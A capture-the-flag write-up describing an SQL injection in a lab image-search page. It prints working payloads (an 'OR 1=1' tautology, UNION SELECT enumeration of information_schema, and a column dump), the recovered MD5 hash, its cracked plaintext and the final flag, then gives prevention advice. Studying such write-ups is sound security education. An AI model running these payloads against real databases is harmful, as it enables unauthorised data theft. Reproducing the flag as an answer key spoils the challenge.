# Image SQL Injection

## Summary

This breach is located in the image search page.

The input is vulnerable to SQL injection because the application inserts user input into a SQL query without proper sanitization or prepared statements.

By injecting SQL payloads, I was able to:

1. List all images.
2. Enumerate image-related databases and tables.
3. Enumerate columns from the image table.
4. Dump the hidden comment containing an MD5 hash.
5. Crack the MD5 hash, lowercase the plaintext, then calculate SHA256 to get the flag.

Final flag:

```txt
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

## How I Discovered It

I started by testing whether the image input was interpreted as part of a SQL condition.

Payload:

```sql
1 OR 1=1#
```

This returned all image rows:

```txt
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_

Title: 42 !
Url : https://fr.wikipedia.org/wiki/Fichier:42

Title: Google
Url : https://fr.wikipedia.org/wiki/Logo_de_Go

Title: Earth
Url : https://en.wikipedia.org/wiki/Earth#/med

Title: Hack me ?
Url : borntosec.ddns.net/images.png
```

Because `1=1` is always true, returning all rows confirmed that the input was vulnerable to SQL injection.

## Exploitation Steps

### 1. List Image-Related Tables

I enumerated database tables:

```sql
0 UNION SELECT table_name, table_schema FROM information_schema.tables--
```

Interesting result:

```txt
Title: Member_images
Url : list_images
```

This means:

```txt
database/schema: Member_images
table: list_images
```

### 2. List Columns

Next, I enumerated columns:

```sql
0 UNION SELECT column_name, table_name FROM information_schema.columns--
```

Interesting results:

```txt
Title: list_images
Url : id

Title: list_images
Url : url

Title: list_images
Url : title

Title: list_images
Url : comment
```

The useful table structure was:

```txt
Member_images.list_images(id, url, title, comment)
```

### 3. Dump Image Comments

I then dumped the `title` and `comment` columns from the image table:

```sql
0 UNION SELECT title, comment FROM Member_images.list_images--
```

Result:

```txt
Title: An image about the NSA !
Url : Nsa

Title: There is a number..
Url : 42 !

Title: Google it !
Url : Google

Title: Earth!
Url : Earth

Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : Hack me ?
```

The important value was:

```txt
1928e8083cf461a51303633093573c46
```

## Hash Transformation

The message says:

```txt
use this md5 decode lowercase then sha256 to win this flag
```

The MD5 hash:

```txt
1928e8083cf461a51303633093573c46
```

cracks to:

```txt
albatroz
```

It is already lowercase, so I calculated SHA256 of:

```txt
albatroz
```

Command:

```bash
python3 -c 'import hashlib; print(hashlib.sha256("albatroz".encode()).hexdigest())'
```

Result:

```txt
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

This is the flag.

If a different SHA256 value appears, it usually means the wrong input was hashed, such as the MD5 string itself, an extra space, or a newline.

## Why This Is Vulnerable

The application directly uses user input inside a SQL query.

Instead of treating the image search value as data, the database interprets injected SQL code.

This allowed me to query `information_schema`, discover table names and column names, then dump data from:

```txt
Member_images.list_images
```

## Impact

An attacker can read database information that should not be exposed.

In this case, SQL injection exposed hidden image metadata and a hash that led to the flag.

In a real application, this could expose private media records, internal URLs, user data, comments, or credentials.

## How To Prevent It

Recommended fixes:

- Use prepared statements / parameterized queries.
- Never concatenate raw user input into SQL.
- Validate numeric search parameters server-side.
- Use least-privilege database accounts.
- Do not expose detailed SQL errors or database structure.
- Avoid storing secrets in database comments or metadata.
- Monitor suspicious SQL patterns such as `UNION SELECT`, `OR 1=1`, and access to `information_schema`.

Example safe pattern:

```php
$stmt = $pdo->prepare("SELECT title, url FROM list_images WHERE id = ?");
$stmt->execute([$imageId]);
```

The main lesson is:

```txt
Every input that reaches a SQL query must be parameterized. Filtering the UI is not enough.
```
